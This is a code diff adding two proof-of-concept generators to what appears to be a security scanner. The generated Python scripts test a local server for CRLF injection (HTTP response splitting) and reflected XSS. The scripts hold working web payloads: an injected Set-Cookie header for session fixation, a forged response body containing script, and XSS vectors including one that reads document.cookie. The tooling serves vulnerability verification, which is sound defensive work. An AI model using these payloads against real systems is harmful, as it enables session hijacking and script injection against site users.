@@ -47,6 +47,10 @@ pub fn generate_poc(
     Some(generate_ws_hijack_poc(finding))
   } else if rule_id == "CWE-79/inner-html" {
     Some(generate_inner_html_poc(finding))
+  } else if rule_id == "CWE-113/crlf-injection" {
+    Some(generate_crlf_poc(finding))
+  } else if rule_id == "CWE-79/template-injection" {
+    Some(generate_template_xss_poc(finding))
   } else {
     None
   }
@@ -482,6 +486,214 @@ pub fn poc_type_str(t : PoCType) -> String {
     BrowserBased => "browser"
     CLICommand => "cli"
   }
+}
+
+///|
+fn generate_crlf_poc(finding : Finding) -> PoCTemplate {
+  {
+    finding,
+    poc_type: RawSocket,
+    title: "HTTP Response Splitting via CRLF Injection",
+    description: "Injects \\r\\n sequences into HTTP header values to split the response, enabling session fixation, cache poisoning, or XSS.",
+    prerequisites: ["Target server running", "Python 3.8+"],
+    attack_steps: [
+      "Identify endpoint that reflects input in response headers", "Inject \\r\\n into a header value to create a second response",
+      "Inject Set-Cookie header for session fixation", "Inject HTML body for reflected XSS via response splitting",
+    ],
+    script: build_crlf_script(finding),
+    expected_result: "Injected CRLF characters cause HTTP response splitting: attacker-controlled headers or body appear in the response",
+    cwe_url: "https://cwe.mitre.org/data/definitions/113.html",
+  }
+}
+
+///|
+fn build_crlf_script(finding : Finding) -> String {
+  let buf = StringBuilder::new()
+  buf.write_string("#!/usr/bin/env python3\n")
+  buf.write_string("\"\"\"HTTP Response Splitting (CRLF Injection) PoC - ")
+  buf.write_string(finding.file)
+  buf.write_string(":")
+  buf.write_string(finding.line.to_string())
+  buf.write_string("\n")
+  buf.write_string(
+    "Tests whether the server sanitizes CRLF in header values.\n",
+  )
+  buf.write_string("A vulnerable server will reflect injected headers/body.\n")
+  buf.write_string("\"\"\"\n")
+  buf.write_string("import socket\n\n")
+  buf.write_string("TARGET = \"localhost\"\n")
+  buf.write_string("PORT = 19002  # adjust to target port\n\n")
+  buf.write_string("# --- Test 1: Header injection via CRLF ---\n")
+  buf.write_string("# Inject a fake Set-Cookie header for session fixation\n")
+  buf.write_string("CRLF = \"\\r\\n\"\n")
+  buf.write_string(
+    "INJECT_HEADER = f\"benign-value{CRLF}Set-Cookie: session=attacker-controlled; Path=/\"\n\n",
+  )
+  buf.write_string("# --- Test 2: Full response splitting (XSS) ---\n")
+  buf.write_string(
+    "# Inject a complete second HTTP response with XSS payload\n",
+  )
+  buf.write_string("INJECT_BODY = (\n")
+  buf.write_string("    f\"benign-value{CRLF}{CRLF}\"\n")
+  buf.write_string(
+    "    f\"<html><script>alert('XSS-via-CRLF')</script></html>\"\n",
+  )
+  buf.write_string(")\n\n")
+  buf.write_string("# --- Test 3: Header injection via encoded CRLF ---\n")
+  buf.write_string("INJECT_ENCODED = \"benign%0d%0aX-Injected: true\"\n\n")
+  buf.write_string("test_payloads = [\n")
+  buf.write_string("    (\"Raw CRLF header injection\", INJECT_HEADER),\n")
+  buf.write_string("    (\"Response splitting with XSS\", INJECT_BODY),\n")
+  buf.write_string("    (\"URL-encoded CRLF\", INJECT_ENCODED),\n")
+  buf.write_string("]\n\n")
+  buf.write_string("for name, payload in test_payloads:\n")
+  buf.write_string("    print(f\"\\n[TEST] {name}\")\n")
+  buf.write_string("    print(f\"  Payload: {repr(payload[:60])}\")\n")
+  buf.write_string("    try:\n")
+  buf.write_string(
+    "        sock = socket.create_connection((TARGET, PORT), timeout=5)\n",
+  )
+  buf.write_string(
+    "        # Send request with injected value in a custom header\n",
+  )
+  buf.write_string("        req = (\n")
+  buf.write_string("            f\"GET / HTTP/1.1\\r\\n\"\n")
+  buf.write_string("            f\"Host: {TARGET}:{PORT}\\r\\n\"\n")
+  buf.write_string("            f\"X-Test-Input: {payload}\\r\\n\"\n")
+  buf.write_string("            f\"Connection: close\\r\\n\"\n")
+  buf.write_string("            f\"\\r\\n\"\n")
+  buf.write_string("        )\n")
+  buf.write_string("        sock.sendall(req.encode())\n")
+  buf.write_string("        resp = b\"\"\n")
+  buf.write_string("        while True:\n")
+  buf.write_string("            chunk = sock.recv(4096)\n")
+  buf.write_string("            if not chunk:\n")
+  buf.write_string("                break\n")
+  buf.write_string("            resp += chunk\n")
+  buf.write_string("        sock.close()\n")
+  buf.write_string("        decoded = resp.decode(errors=\"replace\")\n\n")
+  buf.write_string("        # Check for evidence of injection\n")
+  buf.write_string("        vulns = []\n")
+  buf.write_string("        if \"Set-Cookie: session=attacker\" in decoded:\n")
+  buf.write_string(
+    "            vulns.append(\"Session fixation via injected Set-Cookie\")\n",
+  )
+  buf.write_string("        if \"X-Injected: true\" in decoded:\n")
+  buf.write_string("            vulns.append(\"Arbitrary header injection\")\n")
+  buf.write_string("        if \"XSS-via-CRLF\" in decoded:\n")
+  buf.write_string(
+    "            vulns.append(\"Response splitting with XSS payload\")\n",
+  )
+  buf.write_string("        if vulns:\n")
+  buf.write_string(
+    "            print(f\"  [VULNERABLE] {'; '.join(vulns)}\")\n",
+  )
+  buf.write_string("        else:\n")
+  buf.write_string(
+    "            print(\"  [SAFE] CRLF characters sanitized or not reflected\")\n",
+  )
+  buf.write_string("    except Exception as e:\n")
+  buf.write_string("        print(f\"  [ERROR] {e}\")\n\n")
+  buf.write_string("print(\"\\n\" + \"=\" * 50)\n")
+  buf.write_string(
+    "print(\"If any test shows [VULNERABLE], the server does not\")\n",
+  )
+  buf.write_string(
+    "print(\"sanitize CRLF in header values. Attackers can:\")\n",
+  )
+  buf.write_string("print(\"  - Fixate sessions via injected Set-Cookie\")\n")
+  buf.write_string("print(\"  - Poison caches with forged responses\")\n")
+  buf.write_string("print(\"  - Execute XSS via response body injection\")\n")
+  buf.to_string()
+}
+
+///|
+fn generate_template_xss_poc(finding : Finding) -> PoCTemplate {
+  {
+    finding,
+    poc_type: HttpRequest,
+    title: "Reflected XSS via Template String Interpolation",
+    description: "Demonstrates XSS by injecting HTML/JS through string interpolation in HTTP responses without output encoding.",
+    prerequisites: ["Target server running", "Python 3.8+"],
+    attack_steps: [
+      "Identify endpoint that reflects user input via string interpolation", "Send request with XSS payload in query parameter or path",
+      "Verify unescaped HTML appears in response body", "Demonstrate JavaScript execution in browser context",
+    ],
+    script: build_template_xss_script(finding),
+    expected_result: "User input containing <script> tags is reflected unescaped in the HTML response",
+    cwe_url: "https://cwe.mitre.org/data/definitions/79.html",
+  }
+}
+
+///|
+fn build_template_xss_script(finding : Finding) -> String {
+  let buf = StringBuilder::new()
+  buf.write_string("#!/usr/bin/env python3\n")
+  buf.write_string("\"\"\"Reflected XSS via Template Interpolation PoC - ")
+  buf.write_string(finding.file)
+  buf.write_string(":")
+  buf.write_string(finding.line.to_string())
+  buf.write_string("\n")
+  buf.write_string(
+    "Tests whether user input is reflected in HTML responses without encoding.\n",
+  )
+  buf.write_string("\"\"\"\n")
+  buf.write_string("import http.client\n")
+  buf.write_string("from urllib.parse import quote\n\n")
+  buf.write_string("TARGET = \"localhost\"\n")
+  buf.write_string("PORT = 19002  # adjust to target port\n\n")
+  buf.write_string("# XSS payloads of increasing sophistication\n")
+  buf.write_string("payloads = [\n")
+  buf.write_string(
+    "    (\"Basic script tag\", \"<script>alert('XSS')</script>\"),\n",
+  )
+  buf.write_string(
+    "    (\"Event handler\", \"<img src=x onerror=alert(document.domain)>\"),\n",
+  )
+  buf.write_string(
+    "    (\"SVG onload\", \"<svg onload=alert(document.cookie)>\"),\n",
+  )
+  buf.write_string("    (\"Body onload\", '\"onmouseover=\"alert(1)'),\n")
+  buf.write_string("]\n\n")
+  buf.write_string("# Test common reflection points\n")
+  buf.write_string("endpoints = [\n")
+  buf.write_string("    \"/\",\n")
+  buf.write_string("    \"/search\",\n")
+  buf.write_string("    \"/user\",\n")
+  buf.write_string("    \"/page\",\n")
+  buf.write_string("]\n\n")
+  buf.write_string("for ep in endpoints:\n")
+  buf.write_string("    for name, payload in payloads:\n")
+  buf.write_string(
+    "        path = f\"{ep}?q={quote(payload)}&name={quote(payload)}\"\n",
+  )
+  buf.write_string("        try:\n")
+  buf.write_string(
+    "            conn = http.client.HTTPConnection(TARGET, PORT, timeout=5)\n",
+  )
+  buf.write_string("            conn.request(\"GET\", path)\n")
+  buf.write_string("            resp = conn.getresponse()\n")
+  buf.write_string(
+    "            body = resp.read().decode(errors=\"replace\")\n",
+  )
+  buf.write_string("            conn.close()\n")
+  buf.write_string(
+    "            # Check if payload appears unescaped in response\n",
+  )
+  buf.write_string("            if payload in body:\n")
+  buf.write_string(
+    "                print(f\"[VULNERABLE] {ep} | {name}: payload reflected unescaped\")\n",
+  )
+  buf.write_string(
+    "                print(f\"  Response snippet: ...{body[body.index(payload)-20:body.index(payload)+len(payload)+20]}...\")\n",
+  )
+  buf.write_string("            elif resp.status < 400:\n")
+  buf.write_string(
+    "                print(f\"[SAFE] {ep} | {name}: input encoded or not reflected\")\n",
+  )
+  buf.write_string("        except Exception as e:\n")
+  buf.write_string("            pass  # endpoint doesn't exist, skip\n")
+  buf.to_string()
 }
 
 ///|
